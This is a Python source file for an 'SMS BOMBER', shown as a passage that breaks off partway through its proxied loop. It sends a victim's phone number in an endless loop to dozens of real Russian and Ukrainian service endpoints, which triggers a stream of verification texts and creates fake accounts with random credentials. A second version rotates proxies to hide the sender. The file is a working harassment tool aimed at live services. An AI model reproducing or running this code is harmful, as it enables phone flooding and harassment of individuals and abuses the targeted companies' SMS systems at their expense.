import requests, random
from requests import get
from bs4 import BeautifulSoup as bs
import colorama
from termcolor import colored
from tkinter import filedialog as fd
from tkinter import *
from tkinter import messagebox
from tkinter import Label
from random import randint
import threading, os, sys, time
colorama.init()
root = Tk()
root.title('SMS BOMBER BY HZF')
root.geometry('500x400+300+200')

def good():
    print(colored('SMS sent', 'green'))


def error():
    print(colored('SMS not sent', 'red'))


def spamNOproxy(phone):
    while True:
        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        _email = _name + '@gmail.com'
        email = _name + '@gmail.com'
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
        _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
        _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _text = 'Ляля'
        phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + phone[6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + phone[10]
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://oauth.sovest.ru/oauth/authorize', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phone9})
            good()
        except Exception as e:
            error()

        try:
            requests.get('https://www.sportmaster.ru/user/session/sendSmsCode.do?phone=+' + _phone + '&_=1580559110407')
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ctx.playfamily.ru/screenapi/v3/sendsmscode/web/1', data={'phone':_phone,  'password':password})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://my.pozvonim.com/api/v1/auth/send/sms', data={'phone':_phone,  'origin':'https://my.pozvonim.com',  'referer':'https://my.pozvonim.com/register/',  'host':'my.pozvonim.com'})
            good()
        except Exception as e:
            error()

        try:
            requests.get(('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + _phone), data={'host':'register.sipnet.ru',  'origin':'https://www.sipnet.ru',  'referer':'https://www.sipnet.ru/register'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':_phone,  'countryCode':'ID',  'name':'test',  'email':'mail@mail.com',  'deviceToken':'*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':_name,  'phone':_phone,  'promo':'yellowforma'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName':'loginByUserPhoneVerification',  'fromCheckout':'false',  'fromRegisterPage':'true',  'snLogin':'',  'bpg':'',  'snProviderId':''}, data={'phone':'+7 915 3509908',  'g-recaptcha-response':'',  'recaptcha':'on'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName':'registration',  'variables':{'client': {'firstName':'Иван',  'lastName':'Иванов',  'phone':_phone,  'typeKeys':['Unemployed']}},  'query':'mutation registration($client: ClientInput!) {\n  registration(client: $client) {\n    token\n    __typename\n  }\n}\n'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type':'personal',  'email':_email,  'mobile_phone':_phone,  'deliveryOption':'sms'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0',  'protocol':'5',  'method':'Пользователь.ЗаявкаНаФизика',  'params':{'phone': _phone},  'id':'1'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={'phone':'+' + _phone,  'api':2,  'email':'email',  'x-email':'x-email'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://plink.tech/register/', json={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://smsgorod.ru/sendsms.php', data={'number': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={'birthday':{'day':15,  'month':12,  'year':1997},  'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',  'include_verification_code':True,  'password':password,  'phone_number':_phone,  'username':username})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone}, headers={'App-ID': 'cabinet'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':_name,  'feedbackPhone':'+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://mobileplanet.ua/register', data={'klient_name':_name,  'klient_phone':'+' + _phone,  'klient_email':_email})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://protovar.com.ua/aj_record', data={'object':'callback',  'user_name':_name,  'contact_phone':_phone[3:]})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://e-vse.online/mail2.php', data={'telephone': '+' + _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name,  'telephone':_phone[2:],  'email':_email,  'password':password,  'form_key':'Zqqj7CyjkKG2ImM8'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B' + _phone[0:7] + '-' + _phone[8:11])
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,  'registration_phone':_phone[2:],  'registration_email':_email})
            good()
        except Exception as e:
            error()

        try:
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}", data={'result': 'ok'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://my.citrus.ua/api/v2/register', data={'email':_email,  'name':_name,  'phone':_phone[2:],  'password':'fgfg',  'confirm_password':'fgfg'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login',  'sessid':'bf70db951f54b837748f69b75a61deb4',  'method':'sendCode',  'phone':_phone,  'registration':'N'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': phone})
            good()
        except Exception as e:
            error()

        try:
            a = requests.get('https://driver.gett.ru/signup/')
            requests.post('https://driver.gett.ru/api/login/phone/', data={'phone':phone,  'registration':'true'}, headers={'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'en-US,en;q=0.5',  'Connection':'keep-alive',  'Cookie':'csrftoken=' + a.cookies['csrftoken'] + '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2',  'Host':'driver.gett.ru',  'Referer':'https://driver.gett.ru/signup/',  'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',  'X-CSRFToken':a.cookies['csrftoken']})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data={'phone': phone}, headers={'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',  'Connection':'keep-alive',  'Host':'api.ivi.ru',  'origin':'https://www.ivi.ru/',  'Referer':'https://www.ivi.ru/profile'})
            good()
        except Exception as e:
            error()

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm')
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone}, headers={'Accept-Language':'en-US,en;q=0.5',  'Connection':'keep-alive',  'Cookie':'JSESSIONID=' + b.cookies['JSESSIONID'] + ';',  'Host':'drugvokrug.ru',  'Referer':'https://drugvokrug.ru/',  'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',  'X-Requested-With':'XMLHttpRequest'})
            good()
        except Exception as e:
            error()

        try:
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
            good()
        except Exception as e:
            error()

        try:
            rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone})
            good()
        except Exception as e:
            error()

        try:
            psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван',  'middleName':'Иванович',  'lastName':'Иванов',  'sex':'1',  'birthDate':'10.10.2000',  'mobilePhone':phone[1:],  'russianFederationResident':'true',  'isDSA':'false',  'personalDataProcessingAgreement':'true',  'bKIRequestAgreement':'null',  'promotionAgreement':'true'})
            good()
        except Exception as e:
            error()

        try:
            beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
            good()
        except Exception as e:
            error()

        try:
            modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша',  'CellPhone':phone[1:],  'Package':'optimal'})
            good()
        except Exception as e:
            error()

        try:
            data = {'form[NAME]':'Иван',
             'form[PERSONAL_GENDER]':'M',
             'form[PERSONAL_BIRTHDAY]':'11.02.2000',
             'form[EMAIL]':'fbhbdfvbd@gmail.com',
             'form[LOGIN]':phone1,
             'form[PASSWORD]':None,
             'get-new-password':'Получите пароль по SMS',
             'user_agreement':'on',
             'personal_data_agreement':'on',
             'formType':'full',
             'utc_offset':180}
            aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data=data)
            good()
        except Exception as e:
            error()

        try:
            tvzavr = requests.post('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=' + phone + '&csrf_value=a222ba2a464543f5ac6ad097b1e92a49')
            good()
        except Exception as e:
            error()

        try:
            cook = requests.post('https://www.netprint.ru/order/profile')
            headers = {'Accept':'application/json, text/javascript, */*; q=0.01',
             'Accept-Encoding':'gzip, deflate, br',
             'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
             'Connection':'keep-alive',
             'Content-Length':145,
             'Cookie':'unbi=' + cook.cookies['unbi'],
             'Host':'www.netprint.ru',
             'Origin':'https://www.netprint.ru',
             'Referer':'https://www.netprint.ru/order/profile',
             'Sec-Fetch-Mode':'cors',
             'Sec-Fetch-Site':'same-origin',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
             'X-Requested-With':'XMLHttpRequest'}
            netprint = requests.post('https://www.netprint.ru/order/social-auth', headers=headers, data={'operation':'stdreg',  'email_or_phone':phonew,  'i_agree_with_terms':1})
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://youdrive.today/login/web/phone', data={'phone':phone,  'phone_code':7})
            good()
        except Exception as e:
            error()

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone + '&country_code=%2B7&nod=4&locale=en')
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.carsmile.com/', json={'operationName':'enterPhone',
             'variables':{'phone': phone},  'query':'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.delitime.ru/api/v2/signup', data={'SignupForm[username]':phone,
             'SignupForm[device_type]':3})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn':phone,
             'locale':'en',  'countryCode':'ru',  'version':'1',
             'k':'ic1rtwz1s1Hj1O0r',  'r':'46763'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'mode':'request',
             'phone':'+' + phone,  'phone_permission':'unknown',
             'stream_id':0,  'v':3,  'appversion':'3.20.6',  'osversion':'unknown',
             'devicemodel':'unknown'})
            good()
        except Exception as e:
            error()

        try:
            password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password':password,  'application':'lkp',  'login':'+' + phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', json={'phone': phone})
            good()
        except Exception as e:
            error()

        try:
            requests.get('https://findclone.ru/register?phone=+' + phone)
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number':_phone9,  'version':'2'}, headers={})
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={'phone': '+' + _phone}, headers={})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]':'+' + _phone,  'RegistrationForm[password]':'12345',  'RegistrationForm[confirmPassword]':'12345',  'yt0':'Регистрация'})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={'data': {'firstName':_text,  'lastName':'***',  'phone':_phone,  'email':_name + '@gmail.com',  'password':_name,  'passwordConfirm':_name}})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':_text,  'phone':_phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://login.mos.ru/sps/recovery/start', json={'login':_phone,  'attr':''})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,  'registration_phone':_phone[2:],  'registration_email':_email})
            good()
        except Exception as e:
            error()


def spamProxy(phone):
    while True:

        def proxy():
            with open(file_name) as file:
                list_proxy = file.read().split('\n')
            random_proxy_count = randint(0, len(list_proxy) - 1)
            try:
                proxies = {'http': list_proxy[random_proxy_count].split(' ')[1]}
                return proxies
            except:
                proxies = {'http': list_proxy[(random_proxy_count - 1)].split(' ')[1]}
                return proxies

        _name = ''
        for x in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        _email = _name + '@gmail.com'
        email = _name + '@gmail.com'
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
        _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
        _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _text = 'Ляля'
        phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + ' ' + phone[4] + phone[5] + phone[6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + phone[10]
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://oauth.sovest.ru/oauth/authorize', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phone9}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.get(('https://www.sportmaster.ru/user/session/sendSmsCode.do?phone=+' + _phone + '&_=1580559110407'), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ctx.playfamily.ru/screenapi/v3/sendsmscode/web/1', data={'phone':_phone,  'password':password}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://my.pozvonim.com/api/v1/auth/send/sms', data={'phone':_phone,  'origin':'https://my.pozvonim.com',  'referer':'https://my.pozvonim.com/register/',  'host':'my.pozvonim.com'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.get(('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + _phone), data={'host':'register.sipnet.ru',  'origin':'https://www.sipnet.ru',  'referer':'https://www.sipnet.ru/register'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':_phone,  'countryCode':'ID',  'name':'test',  'email':'mail@mail.com',  'deviceToken':'*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':_name,  'phone':_phone,  'promo':'yellowforma'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName':'loginByUserPhoneVerification',  'fromCheckout':'false',  'fromRegisterPage':'true',  'snLogin':'',  'bpg':'',  'snProviderId':''}, data={'phone':'+7 915 3509908',  'g-recaptcha-response':'',  'recaptcha':'on'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName':'registration',  'variables':{'client': {'firstName':'Иван',  'lastName':'Иванов',  'phone':_phone,  'typeKeys':['Unemployed']}},  'query':'mutation registration($client: ClientInput!) {\n  registration(client: $client) {\n    token\n    __typename\n  }\n}\n'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type':'personal',  'email':_email,  'mobile_phone':_phone,  'deliveryOption':'sms'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0',  'protocol':'5',  'method':'Пользователь.ЗаявкаНаФизика',  'params':{'phone': _phone},  'id':'1'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={'phone':'+' + _phone,  'api':2,  'email':'email',  'x-email':'x-email'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://plink.tech/register/', json={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://smsgorod.ru/sendsms.php', data={'number': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={'birthday':{'day':15,  'month':12,  'year':1997},  'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',  'include_verification_code':True,  'password':password,  'phone_number':_phone,  'username':username}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone}, headers={'App-ID': 'cabinet'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post(('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/'), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':_name,  'feedbackPhone':'+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://mobileplanet.ua/register', data={'klient_name':_name,  'klient_phone':'+' + _phone,  'klient_email':_email}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://protovar.com.ua/aj_record', data={'object':'callback',  'user_name':_name,  'contact_phone':_phone[3:]}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://e-vse.online/mail2.php', data={'telephone': '+' + _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA', data={'firstname':_name,  'telephone':_phone[2:],  'email':_email,  'password':password,  'form_key':'Zqqj7CyjkKG2ImM8'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post(('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B' + _phone[0:7] + '-' + _phone[8:11]), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,  'registration_phone':_phone[2:],  'registration_email':_email}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}", data={'result': 'ok'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://my.citrus.ua/api/v2/register', data={'email':_email,  'name':_name,  'phone':_phone[2:],  'password':'fgfg',  'confirm_password':'fgfg'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login',  'sessid':'bf70db951f54b837748f69b75a61deb4',  'method':'sendCode',  'phone':_phone,  'registration':'N'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            a = requests.get('https://driver.gett.ru/signup/', proxies=(proxy()))
            requests.post('https://driver.gett.ru/api/login/phone/', data={'phone':phone,  'registration':'true'}, headers={'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'en-US,en;q=0.5',  'Connection':'keep-alive',  'Cookie':'csrftoken=' + a.cookies['csrftoken'] + '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2',  'Host':'driver.gett.ru',  'Referer':'https://driver.gett.ru/signup/',  'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',  'X-CSRFToken':a.cookies['csrftoken']}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data={'phone': phone}, headers={'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',  'Connection':'keep-alive',  'Host':'api.ivi.ru',  'origin':'https://www.ivi.ru/',  'Referer':'https://www.ivi.ru/profile'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm', proxies=(proxy()))
